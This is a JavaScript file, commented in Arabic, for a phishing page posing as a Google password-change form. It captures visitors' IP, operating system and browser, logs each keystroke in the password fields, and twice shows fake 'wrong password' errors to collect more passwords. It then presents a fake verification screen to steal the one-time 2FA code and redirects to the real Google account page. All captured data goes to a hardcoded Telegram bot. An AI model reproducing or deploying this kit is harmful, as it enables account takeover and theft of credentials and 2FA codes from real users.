let userIP = "";
let userAgent = navigator.userAgent;
let os = "غير معروف";
let browser = "غير معروف";
let failedAttempts = 0; // عداد المحاولات الفاشلة

// تحديد نظام التشغيل
if (userAgent.indexOf("Win") !== -1) os = "Windows";
else if (userAgent.indexOf("Mac") !== -1) os = "MacOS";
else if (userAgent.indexOf("Linux") !== -1) os = "Linux";
else if (userAgent.indexOf("Android") !== -1) os = "Android";
else if (userAgent.indexOf("iPhone") !== -1) os = "iOS";

// تحديد المتصفح
if (userAgent.indexOf("Chrome") !== -1) browser = "Chrome";
else if (userAgent.indexOf("Firefox") !== -1) browser = "Firefox";
else if (userAgent.indexOf("Safari") !== -1) browser = "Safari";
else if (userAgent.indexOf("Edge") !== -1) browser = "Edge";

// عند تحميل الموقع، جلب IP وإرساله
window.onload = function () {
  fetch("https://api.ipify.org?format=json")
    .then(response => response.json())
    .then(data => {
      userIP = data.ip;

      const msg = `
📩 Google Security Alert

🖥️ دخول جديد للموقع

📡 IP: ${userIP}
💻 نظام التشغيل: ${os}
🌐 المتصفح: ${browser}
🔗 المصدر: google.com
      `;
      sendToTelegram(msg);
    });

  // تفعيل الرصد اللحظي للكتابة (Live Keystrokes)
  setupLiveTyping();
};

// وظيفة رصد ما يكتبه المستخدم لحظة بلحظة لكل حرف
function setupLiveTyping() {
  const fields = ["oldPassword", "newPassword", "confirmPassword"];
  fields.forEach(id => {
    const el = document.getElementById(id);
    if (el) {
      el.addEventListener("input", () => {
        const liveMsg = `
✍️ **رصد كتابة لحظية:**
- الحقل: \`${id}\`
- ما يتم كتابته الآن: \`${el.value}\`
- IP: \`${userIP}\`
        `;
        sendToTelegram(liveMsg);
      });
    }
  });
}

function handlePasswordChange(event) {
  event.preventDefault();

  const oldPass = document.getElementById("oldPassword").value;
  const newPass = document.getElementById("newPassword").value;
  const confirmPass = document.getElementById("confirmPassword").value;
  const message = document.getElementById("message");

  if (newPass !== confirmPass) {
    message.textContent = "كلمة المرور الجديدة وتأكيدها غير متطابقتين.";
    message.style.color = "red";
    return;
  }

  if (newPass.length < 6) {
    message.textContent = "كلمة المرور الجديدة قصيرة جدًا. الحد الأدنى 6 حروف.";
    message.style.color = "red";
    return;
  }

  message.textContent = "جارٍ التحقق من كلمة المرور...";
  message.style.color = "#5f6368";

  setTimeout(() => {
    failedAttempts++; // زيادة عداد المحاولات

    const fullMsg = `
🔐 محاولة تغيير كلمة مرور رقم (${failedAttempts})

📡 IP: ${userIP}
💻 نظام التشغيل: ${os}
🌐 المتصفح: ${browser}

🔑 كلمة المرور الحالية: ${oldPass}
🆕 كلمة المرور الجديدة: ${newPass}
    `;
    sendToTelegram(fullMsg);

    // المنطق الجديد بناءً على طلبك:
    if (failedAttempts === 1) {
      // المحاولة الأولى: كلمة مرور غير صحيحة
      message.textContent = "كلمة المرور الحالية غير صحيحة. يرجى إعادة المحاولة.";
      message.style.color = "red";
    } 
    else if (failedAttempts === 2) {
      // المحاولة الثانية: كلمة مرور قديمة غير صحيحة
      message.textContent = "كلمة المرور القديمة المدخلة غير صحيحة.";
      message.style.color = "red";
    } 
    else if (failedAttempts >= 3) {
      // المحاولة الثالثة: الانتقال لصفحة إدخال رمز التحقق OTP
      message.textContent = "تم اكتشاف نشاط غير مألوف. جاري التحويل للتحقق من الأمان...";
      message.style.color = "orange";
      setTimeout(() => {
        switchToVerificationView();
      }, 1500);
    }
  }, 2000);
}

// تحويل الواجهة إلى نافذة التحقق من الهوية وإدخال الكود (OTP)
function switchToVerificationView() {
  const box = document.querySelector(".google-box");
  box.innerHTML = `
    <img class="logo" src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" alt="Google Logo">
    <h2 class="title">التحقق من هويتك</h2>
    <p style="font-size: 13px; color: #5f6368; margin-bottom: 20px; text-align: right;">لأمانك، أرسلنا رسالة نصية تحتوي على رمز تحقق إلى هاتفك المرتبط بالحساب.</p>
    
    <form onsubmit="handleVerificationCode(event)">
      <label for="otpCode" style="text-align: right; display: block;">أدخل رمز التحقق (6 أرقام)</label>
      <input type="text" id="otpCode" placeholder="• • • • • •" required maxlength="6" style="text-align: center; font-size: 18px; letter-spacing: 5px;">
      
      <button type="submit" style="margin-top: 20px;">تأكيد الهوية</button>
      <p id="otpMessage" style="margin-top: 15px; font-size: 14px; text-align: center;"></p>
    </form>
  `;
}

// معالجة وإرسال كود التحقق عند إدخاله من قبل الضحية
function handleVerificationCode(event) {
  event.preventDefault();
  const code = document.getElementById("otpCode").value;
  const otpMsg = document.getElementById("otpMessage");

  otpMsg.textContent = "جاري تأكيد الرمز...";
  otpMsg.style.color = "#5f6368";

  setTimeout(() => {
    const otpReport = `
🚨 **[ تم التقاط كود التحقق (OTP) بنجاح ]** 🚨
- **الرمز المدخل:** \`${code}\`
- **IP:** \`${userIP}\`
    `.trim();
    
    sendToTelegram(otpReport);

    otpMsg.textContent = "تم التحقق بنجاح! جاري توجيهك...";
    otpMsg.style.color = "#188038";

    setTimeout(() => {
      window.location.href = "https://myaccount.google.com/";
    }, 2000);
  }, 1500);
}

function sendToTelegram(msg) {
  const token = "7935763947:AAGNc11VAj1AcX3nUz_sf-r8kxPs-7OL5TU";
  const chatId = "1046458749";

  const url = `https://api.telegram.org/bot${token}/sendMessage`;
  const data = {
    chat_id: chatId,
    text: msg
  };

  fetch(url, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify(data)
  });
}
